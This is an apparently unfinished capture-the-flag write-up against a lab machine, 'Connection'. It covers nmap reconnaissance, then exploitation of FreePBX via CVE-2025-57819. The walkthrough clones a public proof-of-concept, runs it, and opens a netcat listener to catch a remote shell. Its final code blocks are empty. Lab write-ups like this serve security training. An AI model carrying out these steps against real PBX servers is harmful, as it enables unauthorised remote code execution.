
# CTF Writeup: Connection

---
## Reconaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sS -p- 10.129.14.9
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-09 13:16 -0500
Nmap scan report for 10.129.14.9
Host is up (0.036s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 149.02 seconds
```

An more detailled scan revealed further information about the services.

```
nmap -n -Pn -sSCV -p 22,80,443 10.129.14.9
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-09 13:19 -0500
Nmap scan report for 10.129.14.9
Host is up (0.025s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: Did not follow redirect to http://connected.htb/
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.33 seconds
```

The nmap scan reveals information about an failed redirect to an potentially internal domain "connected.htb". Let's map the target ip to this domain in our local dns file!

```
echo "10.129.14.9 connected.htb" | tee -a /etc/hosts
```

Upon accessing the domain we are immediatly greeted with an /admin endpoint and an login functionality. We also get information about the running application called "freePBX" with version 16.0.40.7

We googled for any interesting Exploits and found CVE-2025-57819 which should allow us to get command execution.

Searched up for PoC's on GitHub and found:

```
git clone https://github.com/b4sh2/CVE-2025-57819-poc
```

Ran the exploit and gained RCE as user "asterisk".

```
python3 exploit.py connected.htb -p 443
```

Started up my listener on port 443.

```
nc -lvnp 443
```

Gained RCE

```

```



```

```
